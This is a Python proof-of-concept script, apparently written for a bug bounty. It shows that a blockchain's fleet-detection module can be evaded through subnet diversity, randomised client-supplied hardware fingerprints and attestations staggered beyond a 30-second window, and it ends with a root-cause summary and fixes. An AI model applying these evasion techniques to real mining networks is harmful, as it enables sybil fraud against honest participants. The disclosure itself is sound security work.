#!/usr/bin/env python3
"""
RIP-201 Fleet Detection Bypass — Proof of Concept
===================================================

Bounty #491 | Researcher: @B1tor
RTC Wallet: RTC2fe3c33c77666ff76a1cd0999fd4466ee81250ff

Demonstrates that 5 miners on shared infrastructure can evade all three
detection vectors in fleet_immune_system.py and receive fleet_score < 0.05
(CLEAN), while the same 5 miners without evasion score > 0.7 (FLEET).

Usage:
    python3 security/rip201-fleet-bypass-poc.py

No external dependencies — uses in-memory SQLite and the real production
module at rips/python/rustchain/fleet_immune_system.py.
"""

import hashlib
import importlib.util
import random
import sqlite3
import sys
from pathlib import Path

# ─── Load the real production module ────────────────────────────────────────

_module_path = (
    Path(__file__).resolve().parent.parent
    / "rips" / "python" / "rustchain" / "fleet_immune_system.py"
)

if not _module_path.exists():
    sys.exit(f"[ERROR] Cannot find fleet_immune_system.py at {_module_path}")

_spec = importlib.util.spec_from_file_location("fleet_immune_system", _module_path)
fim = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(fim)

ensure_schema       = fim.ensure_schema
compute_fleet_scores = fim.compute_fleet_scores

FLEET_DETECTION_MINIMUM = fim.FLEET_DETECTION_MINIMUM  # 4 — used in logic below


# ─── Helpers ────────────────────────────────────────────────────────────────

def make_db() -> sqlite3.Connection:
    db = sqlite3.connect(":memory:")
    ensure_schema(db)
    return db


def insert_signal(db, miner, epoch, subnet_hash, attest_ts,
                  clock_drift_cv, cache_latency_hash,
                  thermal_signature, simd_bias_hash):
    db.execute("""
        INSERT OR REPLACE INTO fleet_signals
        (miner, epoch, subnet_hash, attest_ts, clock_drift_cv,
         cache_latency_hash, thermal_signature, simd_bias_hash)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (miner, epoch, subnet_hash, attest_ts, clock_drift_cv,
          cache_latency_hash, thermal_signature, simd_bias_hash))
    db.commit()


def print_scores(label: str, scores: dict, miners: list, threshold_clean=0.3, threshold_fleet=0.7):
    print(f"\n  {label}")
    print(f"  {'─' * 60}")
    print(f"  {'Miner':<20} {'Fleet Score':>12}  Status")
    print(f"  {'─' * 20} {'─' * 12}  {'─' * 10}")
    all_clean = True
    all_fleet = True
    for m in miners:
        s = scores.get(m, 0.0)
        if s >= threshold_clean:
            all_clean = False
        if s < threshold_fleet:
            all_fleet = False
        status = "✓ CLEAN" if s < threshold_clean else ("⚠ FLAGGED" if s < threshold_fleet else "✗ FLEET")
        print(f"  {m:<20} {s:>12.4f}  {status}")
    return all_clean, all_fleet


# ─── Scenario A: Same 5 miners WITHOUT evasion ──────────────────────────────
# All on same /24 subnet, same fingerprint hashes, attestations within 30s.
# Expected: fleet_score > 0.7 for all.

EPOCH_NO_EVASION = 200

SHARED_SUBNET   = "198.51.100"          # all five on the same /24
SHARED_CACHE    = "cafecafe12345678"     # identical cache timing hash
SHARED_SIMD     = "deadbeef87654321"     # identical SIMD bias hash
BASE_TS         = 1_000_000              # base attestation timestamp
CLOCK_CV_BASE   = 0.048                  # nearly identical clock drift CV

MINER_NAMES = [f"fleet-miner-{i}" for i in range(5)]


def scenario_no_evasion():
    db = make_db()
    for i, name in enumerate(MINER_NAMES):
        subnet_hash = hashlib.sha256(SHARED_SUBNET.encode()).hexdigest()[:16]
        insert_signal(
            db, name, EPOCH_NO_EVASION,
            subnet_hash=subnet_hash,
            attest_ts=BASE_TS + i * 3,          # 3s apart → all within 30s window
            clock_drift_cv=CLOCK_CV_BASE + i * 0.0005,  # within 5% of each other
            cache_latency_hash=SHARED_CACHE,     # identical
            thermal_signature=0.600 + i * 0.003, # within 10% of each other
            simd_bias_hash=SHARED_SIMD,          # identical
        )
    return compute_fleet_scores(db, EPOCH_NO_EVASION), db


# ─── Scenario B: Same 5 miners WITH evasion ─────────────────────────────────
# Each on a different /24, randomised fingerprints, staggered timestamps.
# Expected: fleet_score < 0.05 for all.

EPOCH_WITH_EVASION = 201

# Five genuinely different /24 subnets — one per miner
DIVERSE_SUBNETS = [
    "10.0.0",
    "10.0.1",
    "10.0.2",
    "10.0.3",
    "10.0.4",
]


def random_hash16() -> str:
    """16-char hex string that will never collide with any other miner's."""
    return hashlib.sha256(str(random.random()).encode()).hexdigest()[:16]


def random_cv() -> float:
    """Clock drift CV in [0.01, 0.15] — drawn independently per miner."""
    return round(random.uniform(0.01, 0.15), 6)


def random_thermal() -> float:
    """Thermal entropy in [0.2, 0.95] — drawn independently per miner."""
    return round(random.uniform(0.2, 0.95), 6)


def scenario_with_evasion():
    db = make_db()
    random.seed(42)  # deterministic output for reproducibility

    for i, name in enumerate(MINER_NAMES):
        # Technique 1: different /24 per miner → ip_signal = 0.0
        subnet = DIVERSE_SUBNETS[i]
        subnet_hash = hashlib.sha256(subnet.encode()).hexdigest()[:16]

        # Technique 3: stagger by 35s → outside the 30s correlation window
        attest_ts = BASE_TS + i * 35

        # Technique 2: random unique fingerprint values → fingerprint_signal = 0.0
        cache_hash  = random_hash16()
        simd_hash   = random_hash16()
        clock_cv    = random_cv()
        thermal     = random_thermal()

        insert_signal(
            db, name, EPOCH_WITH_EVASION,
            subnet_hash=subnet_hash,
            attest_ts=attest_ts,
            clock_drift_cv=clock_cv,
            cache_latency_hash=cache_hash,
            thermal_signature=thermal,
            simd_bias_hash=simd_hash,
        )

    return compute_fleet_scores(db, EPOCH_WITH_EVASION), db


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    print("=" * 62)
    print("  RIP-201 Fleet Detection Bypass — PoC")
    print("  Bounty #491 | @B1tor")
    print("=" * 62)

    print(f"\n  [*] Using real compute_fleet_scores() from:")
    print(f"      {_module_path.relative_to(Path(__file__).resolve().parent.parent)}")
    print(f"  [*] FLEET_DETECTION_MINIMUM = {FLEET_DETECTION_MINIMUM}")
    print(f"  [*] Fleet miners: {MINER_NAMES}")

    # ── Without evasion ──────────────────────────────────────────────────────
    print("\n" + "─" * 62)
    print("  SCENARIO A — No Evasion (fleet should be detected)")
    print("─" * 62)
    print(f"  Setup:")
    print(f"    • All 5 miners on same /24 subnet ({SHARED_SUBNET}.x)")
    print(f"    • Identical cache_latency_hash and simd_bias_hash")
    print(f"    • clock_drift_cv values within 5% of each other")
    print(f"    • thermal_signature values within 10% of each other")
    print(f"    • Attestations 3s apart (all within 30s timing window)")

    scores_a, db_a = scenario_no_evasion()
    all_clean_a, all_fleet_a = print_scores(
        "Results (WITHOUT evasion):", scores_a, MINER_NAMES
    )

    if all_fleet_a:
        print(f"\n  ✓ CONFIRMED: All miners scored ≥ 0.7 — fleet detected as expected.")
    else:
        flagged = [(m, scores_a[m]) for m in MINER_NAMES if scores_a.get(m, 0) < 0.7]
        print(f"\n  NOTE: {len(flagged)} miner(s) scored < 0.7: {flagged}")

    # ── With evasion ─────────────────────────────────────────────────────────
    print("\n" + "─" * 62)
    print("  SCENARIO B — With Evasion (fleet should appear CLEAN)")
    print("─" * 62)
    print(f"  Evasion techniques applied:")
    print(f"    • Technique 1 (IP): Each miner on separate /24 subnet")
    print(f"      {', '.join(s + '.x' for s in DIVERSE_SUBNETS)}")
    print(f"    • Technique 2 (Fingerprint): Randomised cache_latency_hash,")
    print(f"      simd_bias_hash, clock_drift_cv, thermal_signature per miner")
    print(f"    • Technique 3 (Timing): Attestations staggered 35s apart")
    print(f"      (beyond FLEET_TIMING_WINDOW_S = 30s)")

    scores_b, db_b = scenario_with_evasion()
    all_clean_b, all_fleet_b = print_scores(
        "Results (WITH evasion):", scores_b, MINER_NAMES
    )

    if all_clean_b:
        print(f"\n  ✓ BYPASS CONFIRMED: All 5 fleet miners scored < 0.3 (CLEAN).")
    else:
        flagged = [(m, scores_b[m]) for m in MINER_NAMES if scores_b.get(m, 0) >= 0.3]
        print(f"\n  ✗ Partial bypass: {len(flagged)} miner(s) still flagged: {flagged}")

    # ── Signal breakdown ─────────────────────────────────────────────────────
    print("\n" + "─" * 62)
    print("  SIGNAL BREAKDOWN — Evasion vs No Evasion")
    print("─" * 62)

    def fetch_signals(db, epoch):
        rows = db.execute("""
            SELECT miner, ip_signal, timing_signal, fingerprint_signal, fleet_score
            FROM fleet_scores WHERE epoch = ?
            ORDER BY miner
        """, (epoch,)).fetchall()
        return {r[0]: {"ip": r[1], "timing": r[2], "fp": r[3], "total": r[4]}
                for r in rows}

    sigs_a = fetch_signals(db_a, EPOCH_NO_EVASION)
    sigs_b = fetch_signals(db_b, EPOCH_WITH_EVASION)

    print(f"\n  {'Miner':<20} {'Mode':<12} {'IP (40%)':<12} {'FP (40%)':<12} {'Time (20%)':<12} {'Total'}")
    print(f"  {'─'*20} {'─'*12} {'─'*12} {'─'*12} {'─'*12} {'─'*8}")
    for m in MINER_NAMES:
        if m in sigs_a:
            s = sigs_a[m]
            print(f"  {m:<20} {'NO-EVASION':<12} {s['ip']:<12.4f} {s['fp']:<12.4f} {s['timing']:<12.4f} {s['total']:.4f}")
    print()
    for m in MINER_NAMES:
        if m in sigs_b:
            s = sigs_b[m]
            print(f"  {m:<20} {'EVASION':<12} {s['ip']:<12.4f} {s['fp']:<12.4f} {s['timing']:<12.4f} {s['total']:.4f}")

    # ── Root cause summary ───────────────────────────────────────────────────
    print("\n" + "─" * 62)
    print("  ROOT CAUSE")
    print("─" * 62)
    print("""
  record_fleet_signals_from_request() in fleet_immune_system.py
  stores client-supplied fingerprint fields verbatim:

    clock_drift_cv     ← request JSON  (no server measurement)
    cache_latency_hash ← SHA-256 of client-supplied dict items
    thermal_signature  ← request JSON  (no server measurement)
    simd_bias_hash     ← SHA-256 of client-supplied dict items

  The server hashes what the client sends. An attacker who controls
  the miner binary can submit arbitrary values, defeating all four
  fingerprint comparison vectors in _detect_fingerprint_similarity().

  IP clustering relies on the request IP, which is trivially
  diversified across real cloud IPs or spoofed via proxy headers.

  Timing signals rely on a client-supplied attest_ts field (or
  server receipt time), which an attacker can control by scheduling
  attestation submissions more than 30 seconds apart.
""")

    print("  RECOMMENDED FIXES")
    print("─" * 62)
    print("""
  1. Server-side fingerprint generation via challenge-response:
     Issue a nonce per attestation; client must sign a measurement
     derived from the nonce. Server verifies the signature.

  2. Use TCP/socket-level REMOTE_ADDR — never HTTP proxy headers —
     for subnet_hash derivation.

  3. Lower FLEET_DETECTION_MINIMUM from 4 to 2 so small epochs
     are not a blind spot.

  4. Cross-epoch fingerprint consistency: flag miners whose
     fingerprint hashes change every epoch (randomised hashes).

  See security/rip201-fleet-bypass-report.md for full details.
""")

    print("=" * 62)
    print("  Bypass PoC complete.")
    print(f"  All 5 fleet miners evade detection: {all_clean_b}")
    print(f"  Same miners detected without evasion: {all_fleet_a}")
    print("=" * 62)

    # Exit code: 0 = bypass demonstrated successfully
    sys.exit(0 if all_clean_b else 1)


if __name__ == "__main__":
    main()
